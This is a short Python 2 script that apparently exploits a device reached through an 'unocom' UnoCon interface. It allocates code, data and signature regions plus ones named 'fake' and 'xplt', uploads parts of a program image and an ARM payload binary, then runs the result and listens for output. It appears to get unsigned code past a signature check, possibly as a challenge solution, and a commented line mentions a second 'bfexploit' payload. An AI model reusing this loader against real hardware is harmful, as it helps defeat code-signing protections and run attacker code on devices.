import os
from unocom import UnoCon
# Offsets
code_offset = 0x5000
data_offset = 0x6000
sign_offset = 0x7000
# Sizes
code_size   = 0x03C8
data_size   = 0x0344
sign_size   = 0x0040
f = open('prog.img', 'r')
arm = open('armpayload.bin', 'r')

#bf = open('bfexploit.bf', 'r')

u = UnoCon()
print u.alloc("code", "code", code_offset, code_size)
print u.alloc("data", "data", data_offset, data_size)
print u.alloc("code", "fake", 0, 0)
print u.alloc("sign", "xplt", 0x10, 0x4000)
print u.alloc("sign", "sign", sign_offset, sign_size)

print u.upload(f, 0x40, code_offset, code_size)
print u.upload(f, 0x408, data_offset, data_size)
print u.upload(f, 0x74C, sign_offset, sign_size)
#u.upload(bf, 0x0, data_offset+data_size, os.stat('bfexploit.bf').st_size)
print u.upload(arm, 0, 0x10, code_size)

print u.run()
u.listen()
